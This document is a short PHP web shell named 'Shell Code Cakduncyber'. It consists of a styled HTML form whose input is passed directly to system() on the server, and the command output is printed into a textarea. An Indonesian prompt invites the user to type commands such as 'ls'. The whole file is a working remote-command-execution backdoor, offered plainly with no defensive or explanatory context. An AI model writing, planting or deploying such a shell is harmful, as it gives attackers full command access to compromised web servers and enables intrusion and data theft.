<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cakdun Cyber</title>


    <style>
        .text-center {
            text-align: center;
            margin-bottom: 6rem;
        }

        .text-danger {
            color: red;
        }

        .input-controller {
            width: 300px;
            outline-style: none;
            height: 30px;
            font-size: 20px;
        }

        .btn-submit {
            margin-top: 2rem;
            width: 200px;
            height: 50px;
            border-radius: 20px;
            font-weight: bold;
            background-color: #00FFFF;
            cursor: pointer;
        }

        .result {
            margin-top: 1rem;
        }

        .result textarea {
            width: 300px;
            outline: none;
        }

        footer {
            text-align: center;
        }
    </style>
</head>

<body>

    <div class="text-center">
        <h1>Shell Code Cakduncyber</h1>

        <p>Silahkan Masukkan Perintah <code class="text-danger">.ls</code> untuk melihat List File dan perintah lainya</p>

        <form action="" method="POST">


            <input type="text" class="input-controller" name="shell" value="ls -l" placeholder="ls -l">
            <br>
            <button type="submit" class="btn-submit">EXECUTE</button>
        </form>


        <div class="result">
            <textarea name="" readonly id="" cols="30" rows="10" disabled>

            <?php if (isset($_POST['shell'])) : ?>
                <?= system($_POST['shell']); ?>
            <?php endif; ?>

            </textarea>
        </div>


    </div>





    <footer>Copyright &copy; <?= date("Y") ?> CakdunCyber</footer>

</body>

</html>